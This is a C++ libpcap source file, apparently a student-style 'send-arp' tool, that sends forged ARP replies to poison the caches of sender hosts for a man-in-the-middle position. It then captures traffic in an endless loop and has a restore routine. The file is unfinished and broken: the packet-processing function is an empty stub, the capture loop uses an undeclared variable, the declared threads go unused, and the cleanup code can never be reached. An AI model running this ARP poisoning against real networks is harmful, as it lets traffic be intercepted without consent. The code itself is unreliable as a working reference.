#define core_num 3
#include <iostream>
#include <string>
#include <stdint.h>
#include <cstring>
#include <pcap.h>
#include <ctype.h>
#include "proto_structures.h"
#include "local_address.h"
#include <map>

struct ipv4_comp{
	bool operator()(const ipv4_addr a,const ipv4_addr b) const{
		return a.word<b.word;
	}
};
std::map<ipv4_addr,mac_addr,ipv4_comp> ip_to_mac;
char errbuf[PCAP_ERRBUF_SIZE];

void add_ip(const ipv4_addr& ip,const ipv4_addr& my_ip,const mac_addr& my_mac,pcap_t* handle){
	do{
		arp_eth_ipv4 packet(my_mac,my_ip,ip);
		if(handle==nullptr){
			printf("pcap error : %s\n",errbuf);
			exit(1);
		}
		pcap_sendpacket(handle,packet,sizeof packet);
		pcap_pkthdr* hdr;
		const uint8_t* ptr;
		if(!pcap_next_ex(handle,&hdr,&ptr)){
			printf("arp no reply\n");
			exit(1);
		}
		memcpy(&packet,ptr,sizeof packet);
	}while(memcmp(&packet.sip,&ip,sizeof ip)||packet.arptype!=htons(0x0002));
	
	ip_to_mac[ip]=packet.smac;
}

/*
mac_addr arp_request(const ipv4_addr& sip,const ipv4_addr& tip,const mac_addr& smac,const char *dev){
	arp_eth_ipv4 packet(smac,sip,tip);
	
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle=pcap_open_live(dev,BUFSIZ,1,1,errbuf);
	if(handle==nullptr){
		printf("pcap error : %s\n",errbuf);
		exit(1);
	}
	pcap_sendpacket(handle,packet,42);
	pcap_pkthdr* hdr;
	const uint8_t* ptr;
	if(!pcap_next_ex(handle,&hdr,&ptr)){
		printf("arp no reply\n");
		exit(1);
	}
	memcpy(&packet,ptr,42);
	pcap_close(handle);
	return packet.smac;
}
*/

void arp_poison(const char *str_sip,const char *str_tip,const ipv4_addr& ip,const mac_addr &mac,pcap_t* handle){
	ipv4_addr sip(str_sip);
	ipv4_addr tip(str_tip);
	mac_addr smac=ip_to_mac[sip];
	
	arp_eth_ipv4 packet(mac,smac,tip,sip);
	
	if(handle==nullptr){
		printf("pcap error : %s\n",errbuf);
		exit(1);
	}
	pcap_sendpacket(handle,packet,42);
}
void arp_recover(const char *str_sip,const char *str_tip,const ipv4_addr& ip,const mac_addr &mac,pcap_t* handle){
	ipv4_addr sip(str_sip);
	ipv4_addr tip(str_tip);
	mac_addr smac=ip_to_mac[sip];
	
	arp_eth_ipv4 packet(mac,smac,tip,sip);
	
	if(handle==nullptr){
		printf("pcap error : %s\n",errbuf);
		exit(1);
	}
	
	pcap_sendpacket(handle,packet,sizeof packet);
}

void* process_packet(void* num){
	
	return nullptr;
}

int main(int c,char **v){
	if(c&1){
		printf("syntex : send-arp <interface> <sender ip> <target ip> ...\n");
		return 1;
	}
	mac_addr mac=get_mac_addr(v[1]);
	ipv4_addr ip=get_ipv4_addr(v[1]);
	pcap_t* handle=pcap_open_live(v[1],BUFSIZ,1,1,errbuf);
	for(int i=2;i<c;i++)
		add_ip(v[i],ip,mac,handle);
	for(int i=2;i<c;i+=2)
		arp_poison(v[i],v[i+1],ip,mac,handle);
	
	pthread_t th[core_num];
	
	for(;;){
		pcap_pkthdr* hdr;
		const uint8_t* ptr;
		if(!pcap_next_ex(handle,&hdr,&ptr)){
			printf("pcap listing failed\n");
			exit(1);
		}
		int len=header->caplen;
		void* packet=malloc(len);
		memcpy(packet,ptr,len);
		
		free(packet);
	}
	
	for(int i=0;i<core_num;i++){
		
	}
	
	for(int i=2;i<c;i+=2)
		arp_recover(v[i],v[i+1],ip,mac,handle);
	pcap_close(handle);
	return 0;
}
